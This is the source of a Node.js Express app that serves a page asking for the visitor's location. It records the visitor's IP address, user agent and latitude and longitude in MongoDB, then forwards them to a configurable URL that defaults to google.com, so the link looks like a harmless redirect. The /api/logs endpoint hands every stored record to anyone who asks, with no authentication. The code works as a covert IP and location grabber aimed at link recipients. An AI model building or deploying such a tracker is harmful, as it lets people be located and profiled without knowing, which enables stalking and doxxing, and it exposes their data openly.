require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const { connectToDatabase } = require('./lib/mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration: Set your redirect URL here
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';

// Middleware to parse JSON
app.use(express.json());

// Helper function to extract IP address
function getClientIP(req) {
  return req.headers['x-forwarded-for'] ||
    req.headers['x-real-ip'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);
}

// Serve the HTML page with location request
app.get('/', (req, res) => {
  const ip = getClientIP(req);
  console.log(`👤 Visitor entered - IP: ${ip}`);

  try {
    let html = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');
    // Replace all occurrences of google.com with the configured REDIRECT_URL
    html = html.replace(/https:\/\/www\.google\.com/g, REDIRECT_URL);
    res.send(html);
  } catch (error) {
    console.error('❌ Error reading index.html:', error);
    res.status(500).send('Internal Server Error');
  }
});

// API endpoint to log IP and location data
app.post('/log', async (req, res) => {
  try {
    const ip = getClientIP(req);
    const { latitude, longitude, accuracy, denied } = req.body;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date();

    const logData = {
      ip,
      timestamp,
      userAgent,
      location: denied
        ? { status: 'DENIED' }
        : (latitude && longitude)
          ? { latitude, longitude, accuracy }
          : { status: 'NOT_AVAILABLE' },
      redirectUrl: REDIRECT_URL
    };

    const locationStr = denied ? 'DENIED' : (latitude && longitude ? `${latitude}, ${longitude}` : 'NOT AVAILABLE');
    console.log(`📍 Location is ${locationStr}`);
    console.log(`↪️  Redirecting to: ${REDIRECT_URL}`);

    // Persist to MongoDB using cached connection
    try {
      const { db } = await connectToDatabase();
      await db.collection('visitor-logs').insertOne(logData);
      console.log('💾 Log saved to MongoDB');
    } catch (dbError) {
      console.warn('⚠️  MongoDB unavailable, logged only to console:', dbError.message);
    }

    res.json({ redirectUrl: REDIRECT_URL });
  } catch (error) {
    console.error('❌ Error in /log endpoint:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API endpoint to retrieve logs
app.get('/api/logs', async (req, res) => {
  try {
    const { db } = await connectToDatabase();
    const limit = parseInt(req.query.limit) || 100;

    const logs = await db.collection('visitor-logs')
      .find({})
      .sort({ timestamp: -1 })
      .limit(limit)
      .toArray();

    res.json({ count: logs.length, logs });
  } catch (error) {
    console.error('❌ Error fetching logs:', error.message);
    res.status(500).json({ error: 'Error fetching logs' });
  }
});

// Start server (only if running locally)
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`🚀 Redirection app running on port ${PORT}`);
    console.log(`📍 Redirecting all traffic to: ${REDIRECT_URL}`);
  });
}

module.exports = app;


